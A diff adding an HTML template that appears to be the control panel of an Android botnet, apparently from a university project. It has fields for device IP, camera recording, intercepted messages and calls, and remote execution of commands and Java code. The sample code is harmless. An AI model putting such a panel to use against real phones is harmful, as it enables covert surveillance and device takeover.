@@ -1,0 +1,57 @@
+<fieldset class="infocontainer">
+<legend>Info</legend>
+<div>
+<div><span class="label">Serial:</span><span class="labelcontent seriallabel">n/a</span></div>
+<div><span class="label">Status:</span><span class="labelcontent statuslabel">n/a</span></div>
+<div><span class="label">Video status:</span><span class="labelcontent videostatuslabel">n/a</span></div>
+<div><span class="label">IP address/port:</span><span class="labelcontent ipportlabel"><span class="iplabel" />:<span class="portlabel" /></span></div>
+<div>
+</fieldset>
+<fieldset style="display:inline;width:49%; float:left">
+<legend>Camera</legend>
+<p><img class="camera" /></p><!-- p important used for spinner (parent of img) -->
+<p>
+<button class="recstart">Record</button>
+<button class="recstop">Stop</button>
+</p>
+</fieldset>
+<fieldset>
+<legend>Real time messages and calls</legend>
+<ul class="msgs">
+</ul>
+</fieldset>
+<fieldset>
+<legend>Recorded videos</legend>
+<ul class="videos">
+</ul>
+</fieldset>
+<fieldset>
+<legend>Sender</legend>
+<div class="sendcommands">
+    <h3>Send command</h3>
+        <div>
+        <label for="command">Command:</label>
+        <input type="text" class="command" > <br >
+
+        <input class="commandexecute" type="submit" value="Execute" >
+	<div class="output commandresult"></div>
+        </div>
+
+    <h3>Send code</h3>
+        <div>
+	<div><textarea cols=120 rows=10 class="code">
+package de.tudarmstadt.botnet.janus_yanai;
+import android.util.Log;
+public class Hello__VERSION__ implements java.util.concurrent.Callable&lt;String&gt; {
+    public String call() {
+        Log.d("LOL", "GUIDO GUIDO");
+        return "ok, executed";
+    }
+}
+</textarea></div>
+	<input class="classname" type="text" value="Hello__VERSION__" >
+        <input type="button" value="Execute code" class="codeexecute" >
+	<div class="output coderesult"></div>
+	</div>
+</div>
+</fieldset>
